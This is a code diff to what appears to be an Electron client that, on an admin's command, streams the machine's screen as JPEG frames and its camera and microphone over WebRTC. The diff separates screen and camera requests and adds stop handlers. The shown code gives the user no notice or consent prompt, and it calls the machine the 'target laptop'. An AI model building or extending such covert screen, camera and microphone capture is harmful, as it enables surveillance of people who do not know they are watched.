@@ -37,12 +37,10 @@ window.onload = async () => {
             socket.emit('register-client', { name: hostname, type: 'all' });
         });
 
-        // When the admin clicks "Watch" on the dashboard
-        socket.on('request-offer', async (adminId) => {
-            console.log("Received 'request-offer' from admin:", adminId);
-            socket.emit('client-error', "Received request-offer, getting screen...");
+        // Handle explicit Screen share request
+        socket.on('request-screen', async (adminId) => {
+            console.log("Admin requested SCREEN");
             try {
-                // Setup Screen Share Stream (WebSockets / JPEG)
                 const sources = await window.electronAPI.getSources();
                 const mainScreen = sources[0];
 
@@ -70,34 +68,36 @@ window.onload = async () => {
                         socket.emit('screen-frame', { frame: frame, targetId: adminId });
                     }
                 }, 500);
-
-                // Setup Camera/Mic Stream (WebRTC)
-                try {
-                    localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                    
-                    if (peerConnection) peerConnection.close();
-                    peerConnection = new RTCPeerConnection(configuration);
-                    iceCandidatesQueue = [];
-
-                    peerConnection.onicecandidate = e => {
-                        if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
-                    };
-
-                    localCameraStream.getTracks().forEach(track => {
-                        peerConnection.addTrack(track, localCameraStream);
-                    });
-
-                    const offer = await peerConnection.createOffer();
-                    await peerConnection.setLocalDescription(offer);
-                    socket.emit('offer', { offer: offer, targetId: adminId });
-                } catch(camErr) {
-                    console.log("No Camera/Mic found or access denied.");
-                    socket.emit('client-error', "Camera not found on target laptop.");
-                }
-
             } catch (e) {
-                console.error("Capture failed", e);
-                socket.emit('client-error', "Capture failed: " + e.message);
+                console.error("Screen Capture failed", e);
+                socket.emit('client-error', "Screen Capture failed: " + e.message);
+            }
+        });
+
+        // Handle explicit Camera/Mic request
+        socket.on('request-camera', async (adminId) => {
+            console.log("Admin requested CAMERA");
+            try {
+                localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+                
+                if (peerConnection) peerConnection.close();
+                peerConnection = new RTCPeerConnection(configuration);
+                iceCandidatesQueue = [];
+
+                peerConnection.onicecandidate = e => {
+                    if (e.candidate) socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
+                };
+
+                localCameraStream.getTracks().forEach(track => {
+                    peerConnection.addTrack(track, localCameraStream);
+                });
+
+                const offer = await peerConnection.createOffer();
+                await peerConnection.setLocalDescription(offer);
+                socket.emit('offer', { offer: offer, targetId: adminId });
+            } catch(camErr) {
+                console.log("No Camera/Mic found or access denied.");
+                socket.emit('client-error', "Camera not found on target laptop.");
             }
         });
 
@@ -120,8 +120,29 @@ window.onload = async () => {
             }
         });
 
+        socket.on('stop-screen', () => {
+             console.log("Stopping screen share");
+             if (screenInterval) clearInterval(screenInterval);
+             if (localScreenStream) {
+                 localScreenStream.getTracks().forEach(t => t.stop());
+                 localScreenStream = null;
+             }
+        });
+
+        socket.on('stop-camera', () => {
+             console.log("Stopping camera/mic");
+             if (localCameraStream) {
+                 localCameraStream.getTracks().forEach(t => t.stop());
+                 localCameraStream = null;
+             }
+             if (peerConnection) {
+                 peerConnection.close();
+                 peerConnection = null;
+             }
+        });
+
         socket.on('stop-watch', () => {
-             console.log("Stopping watch");
+             console.log("Stopping all");
              if (screenInterval) clearInterval(screenInterval);
              if (localScreenStream) {
                  localScreenStream.getTracks().forEach(t => t.stop());
